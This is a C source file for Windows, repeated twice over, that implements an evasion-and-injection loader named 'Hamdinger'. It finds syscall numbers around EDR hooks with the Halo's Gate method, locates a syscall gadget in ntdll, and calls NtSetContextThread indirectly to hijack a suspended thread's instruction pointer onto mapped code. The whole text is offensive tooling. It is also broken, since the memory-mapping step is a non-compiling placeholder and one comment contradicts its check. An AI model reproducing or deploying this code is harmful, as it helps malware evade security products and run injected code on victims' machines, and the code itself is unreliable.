#include <windows.h>
#include <stdio.h>

// External assembly function
extern NTSTATUS InvokeIndirectSyscall(HANDLE hThread, PCONTEXT lpContext, PVOID dummy1, PVOID dummy2, DWORD ssn, PVOID syscallAddr);

#include "hamdinger_data.h"

// --- Halo's Gate: Dynamic SSN Finder ---
DWORD GetSSN(PVOID funcAddr) {
    unsigned char* pFunc = (unsigned char*)funcAddr;
    
    // Check if function is hooked (starts with 0xE9 / JMP)
    if (*pFunc == 0x4C && *(pFunc + 1) == 0x8B && *(pFunc + 2) == 0xD1 && *(pFunc + 3) == 0xB8) {
        return *(DWORD*)(pFunc + 4); // Clean: Return SSN
    }

    // Halo's Gate: Check neighbors if hooked
    for (int i = 1; i < 50; i++) {
        // Check neighbor above
        unsigned char* pAbove = pFunc - (i * 32); 
        if (*pAbove == 0x4C && *(pAbove + 3) == 0xB8) return *(DWORD*)(pAbove + 4) + i;
        
        // Check neighbor below
        unsigned char* pBelow = pFunc + (i * 32);
        if (*pBelow == 0x4C && *(pBelow + 3) == 0xB8) return *(DWORD*)(pBelow + 4) - i;
    }
    return 0;
}

// --- Find 'syscall; ret' in ntdll ---
PVOID FindSyscallInstruction(PVOID funcAddr) {
    unsigned char* pFunc = (unsigned char*)funcAddr;
    for (int i = 0; i < 100; i++) {
        if (*(pFunc + i) == 0x0F && *(pFunc + i + 1) == 0x05 && *(pFunc + i + 2) == 0xC3) {
            return (PVOID)(pFunc + i);
        }
    }
    return NULL;
}

void RunHamdinger() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pNtSCT = GetProcAddress(hNtdll, "NtSetContextThread");
    
    // 1. Get SSN and Syscall Location
    DWORD ssn = GetSSN(pNtSCT);
    PVOID syscallInst = FindSyscallInstruction(pNtSCT);

    // 2. Dual Mapping (Simplified for brevity, use previous logic here)
    // ... [Insert previous NtCreateSection / NtMapViewOfSection logic] ...
    PVOID pLocalViewRX = /* Result of your mapping */;

    // 3. Create Suspended Thread
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetCurrentProcess, NULL, CREATE_SUSPENDED, NULL);

    CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };
    GetThreadContext(hThread, &ctx);
    ctx.Rip = (DWORD64)pLocalViewRX;

    // 4. THE INDIRECT SYSCALL
    // We pass the thread, the context, two dummies (shadow space), the SSN, and the jump target
    InvokeIndirectSyscall(hThread, &ctx, NULL, NULL, ssn, syscallInst);

    ResumeThread(hThread);
    printf("[+] Indirect Hijack Complete.\n");
}

#ifdef BUILD_EXE
int main() { RunHamdinger(); return 0; }
#endif

#include <windows.h>
#include <stdio.h>

// External assembly function
extern NTSTATUS InvokeIndirectSyscall(HANDLE hThread, PCONTEXT lpContext, PVOID dummy1, PVOID dummy2, DWORD ssn, PVOID syscallAddr);

#include "hamdinger_data.h"

// --- Halo's Gate: Dynamic SSN Finder ---
DWORD GetSSN(PVOID funcAddr) {
    unsigned char* pFunc = (unsigned char*)funcAddr;
    
    // Check if function is hooked (starts with 0xE9 / JMP)
    if (*pFunc == 0x4C && *(pFunc + 1) == 0x8B && *(pFunc + 2) == 0xD1 && *(pFunc + 3) == 0xB8) {
        return *(DWORD*)(pFunc + 4); // Clean: Return SSN
    }

    // Halo's Gate: Check neighbors if hooked
    for (int i = 1; i < 50; i++) {
        // Check neighbor above
        unsigned char* pAbove = pFunc - (i * 32); 
        if (*pAbove == 0x4C && *(pAbove + 3) == 0xB8) return *(DWORD*)(pAbove + 4) + i;
        
        // Check neighbor below
        unsigned char* pBelow = pFunc + (i * 32);
        if (*pBelow == 0x4C && *(pBelow + 3) == 0xB8) return *(DWORD*)(pBelow + 4) - i;
    }
    return 0;
}

// --- Find 'syscall; ret' in ntdll ---
PVOID FindSyscallInstruction(PVOID funcAddr) {
    unsigned char* pFunc = (unsigned char*)funcAddr;
    for (int i = 0; i < 100; i++) {
        if (*(pFunc + i) == 0x0F && *(pFunc + i + 1) == 0x05 && *(pFunc + i + 2) == 0xC3) {
            return (PVOID)(pFunc + i);
        }
    }
    return NULL;
}

void RunHamdinger() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pNtSCT = GetProcAddress(hNtdll, "NtSetContextThread");
    
    // 1. Get SSN and Syscall Location
    DWORD ssn = GetSSN(pNtSCT);
    PVOID syscallInst = FindSyscallInstruction(pNtSCT);

    // 2. Dual Mapping (Simplified for brevity, use previous logic here)
    // ... [Insert previous NtCreateSection / NtMapViewOfSection logic] ...
    PVOID pLocalViewRX = /* Result of your mapping */;

    // 3. Create Suspended Thread
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetCurrentProcess, NULL, CREATE_SUSPENDED, NULL);

    CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };
    GetThreadContext(hThread, &ctx);
    ctx.Rip = (DWORD64)pLocalViewRX;

    // 4. THE INDIRECT SYSCALL
    // We pass the thread, the context, two dummies (shadow space), the SSN, and the jump target
    InvokeIndirectSyscall(hThread, &ctx, NULL, NULL, ssn, syscallInst);

    ResumeThread(hThread);
    printf("[+] Indirect Hijack Complete.\n");
}

#ifdef BUILD_EXE
int main() { RunHamdinger(); return 0; }
#endif
